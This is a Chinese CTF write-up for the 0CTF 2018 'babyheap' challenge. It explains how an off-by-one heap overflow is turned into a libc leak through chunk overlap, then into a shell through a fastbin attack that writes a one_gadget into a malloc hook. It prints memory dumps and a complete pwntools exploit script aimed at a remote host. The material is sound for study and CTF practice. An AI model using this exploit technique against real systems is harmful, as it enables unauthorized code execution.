
```text
./off_by_one

(输入前)

0x602000:    0x0000000000000000    0x0000000000000031

0x602010:    0x0000000000000000    0x0000000000000000

0x602020:    0x0000000000000000    0x0000000000000000

0x602030:    0x0000000000000000    0x0000000000000051  -------

0x602040:    0x0000000000000000    0x0000000000000000        |

0x602050:    0x0000000000000000    0x0000000000000000        |

0x602060:    0x0000000000000000    0x0000000000000000        |

0x602070:    0x0000000000000000    0x0000000000000000        |

                                                      　  |

(输入后)                                                 　|

0x602000:    0x0000000000000000    0x0000000000000031        |

0x602010:    0x4141414141414141    0x4141414141414141        |

0x602020:    0x4141414141414141    0x4141414141414141        |

0x602030:    0x4141414141414141    0x0000000000000041 <-------

0x602040:    0x0000000000000000    0x0000000000000000

0x602050:    0x0000000000000000    0x0000000000000000

0x602060:    0x0000000000000000    0x0000000000000000

0x602070:    0x0000000000000000    0x0000000000000000
```

**结论**：可以修改`chunk size`大小。

### 4. 题目分析

**漏洞点**：`Update`功能可以允许我们多输入一个字节。

**我们需要解决如下问题**

> 1. 如何`libc`地址？
> 2. 如何获取`shell`？

**第一个问题**

> 知识点：当只有一个 small/large chunk 被释放时，small/large chunk 的`fd`和`bk`指向`main_arena`中的地址。

答：`Overlap`

```python
alloc(0x48) #0
alloc(0x48) #1
alloc(0x48) #2
update(0, 0x49, "A"*0x48 + "\xa1") #修改1的chunk size为0xa1
free(1) #实际上是将1和2一起释放了
alloc(0x48)   # 申请1
view(2)       # 2我们是可以查看的
```

相关内存

```text
chunk      0x55719bd46000   0x50            (inuse)　------------

chunk      0x55719bd46050   0x50 -----|     (inuse) |alloc(0x48)|

chunk      0x55719bd460a0   0x50 -----|     (inuse) |alloc(0x48)|

chunk      0x55719bd460f0   0x50      |     (inuse) |alloc(0x48)|

                                      |             -------------

chunk      0x55719bd46000   0x50      |      (inuse) -------

chunk      0x55719bd46050   0xa0  <----(1和２)(inuse)|update|

chunk      0x55719bd460f0   0x50      |      (inuse) ----------------

                                      |                      |free(1)|

chunk      0x55719bd46000   0x50      |      (inuse)         ∨-------∨

chunk      0x55719bd46050   0xa0(1和２)---->  (F) FD 0x7f46a1c7cb78 BK 0x7f46a1c7cb78 (LC)                   |

chunk      0x55719bd460f0   0x50      |       (inuse)

                                      |

chunk      0x55719bd46000   0x50      |      (inuse) ------------------------------------------

chunk      0x55719bd46050   0x50      |      (inuse) |alloc(0x48), 輸入2可以將0x7f46a1c7cb78打印出來

chunk      0x55719bd460a0   0x50(2)   -----> (F) FD 0x7f46a1c7cb78 BK 0x7f46a1c7cb78 (LC)

chunk      0x55719bd460f0   0x50            　(inuse)
```

**整体思路**：分配三个`0`、`1`、`2`。通过`Off_By_One`可以将`1`的`chunk size`改为`0xa1`，`free(1)`等于将`1`和`2`一起释放，但`2`标识着未释放。`alloc(0x48)`将`0x7f46a1c7cb78`移到`2`中，打印即可泄露地址。

**第二个问题**

> fastbin attack，在`ralloc_hook`写入`execve("/bin/sh")`来获取`shell`。

通过上一个问题的回答，我们有可能申请两个，这两个的`content`指向同一块内容。

```text
alloc(0x48) # 4 = 2, content申请的地址是0x55719bd460a0,
delete(1)
delete(2)
view(4)

结果:
-------------------------------------------------------
0x55719bd460a0:    0x0000000000000000    0x0000000000000051 |
0x55719bd460b0:    0x000055719bd46050    0x0000000000000000 |
0x55719bd460c0:    0x0000000000000000    0x0000000000000000 |
```

**结论**：由于`fastbin`是单链表链接的，所以`2`的`fd`（下一个）指向了`1`，我们可以任意修改这个地址，来达到任意写的目的。

由于我们题目限制最大申请内存为88，不能直接修改`calloc__hook`，于是我们借助修改`top chunk`，将`top chunk`修改至`calloc_hook`附近，然后再将`execve("/bin/sh")`地址填入`calloc_hook`。

修改：

```python
update(4, 9, p64(addr)) --> 修改地址, addr 是据top chunk的不远处
alloc(0x48)             --> １
alloc(0x40)             --> ２，返回目标地址
update(2, 0x2c, "\x00"*35 + p64(newtop))　--> 修改top chunk 为ralloc_hook 附近
alloc(56)
update(5, 28, "W"*11 + p64(one)*2)　--> 向ralloc_hook写入
alloc(0x28)           --> 由于ralloc_hook处有指针, 执行指针指向的函数
```

**完整EXP**

```python
from pwn import *

context.log_level = 'debug'

HOST='202.120.7.204'
PORT=127

Local = 1

if Local:
    p = process("./babyheap")
    libc_offset = 0x3c4b78 #本机, ubuntu 16.04  
    one_offset = 0x4526a　　
else:
    p=remote(HOST,PORT)
    libc_offset = 0x68+0x399af0 #远程
    one_offset = 0x3f35a

libc = ELF('./libc.so.6')
#gdb.attach(p)

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def delete(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def view(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def leak():
    alloc(0x48) #0
    alloc(0x48) #1
    alloc(0x48) #2
    alloc(0x48) #3

    update(0, 0x49, "A"*0x48 + "\xa1")
    delete(1)   #1
    alloc(0x48) #1
    view(2)     
    p.recvuntil("Chunk[2]: ")
    leak = u64(p.recv(8))
        libc_base = leak - libc_offset
    main_arena = leak - 0x58
    log.info("libc_base: %s" % hex(libc_base))
    log.info("main_arena: %s" % hex(main_arena))

    alloc(0x48) #4 = 2
    delete(1)   
    delete(2)
    view(4)

    p.recvuntil("Chunk[4]: ")
    heap = u64(p.recv(8)) - 0x50
    log.info("heap: %s" % hex(heap))
    return main_arena, libc_base

def exp(main_arena, libc_base):
    alloc(0x58) # 1
    delete(1)  # 1

    addr = main_arena + 37
    newtop = main_arena - 0x33
    one = libc_base + one_offset
    log.info("addr: %s" % hex(addr))
    log.info("newtop: %s " % hex(newtop))
    log.info("one: %s" % hex(one))

    update(4, 9, p64(addr))
    alloc(0x48)
    alloc(0x40)
    update(2, 0x2c, "\x00"*35 + p64(newtop))
    alloc(56)
    update(5, 28, "w"*11 + p64(one)*2)
    alloc(22)

if __name__=='__main__':

    main_arena, libc_base = leak()
    exp(main_arena, libc_base)
    p.interactive()
```

### 多说一句

可能在尝试的过程中，EXP会出现失败的情况，我建议多试几次。

### 结果

![](https://bbs.kanxue.com/upload/attach/201804/738427_Q7DBDVN4EJ4YUCN.png)

### 参考链接

[0CTF Babyheap 2018](<https://bbs.kanxue.com/elink@9eeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2@1k6i4u0F1j5h3I4K6j5h3E0#2M7X3p5I4x3#2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0S2Q4x3V1j5H3y4q4)9J5c8U0l9K6i4K6u0r3j5X3q4T1P5h3S2W2j5i4m8Q4x3V1j5`>)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
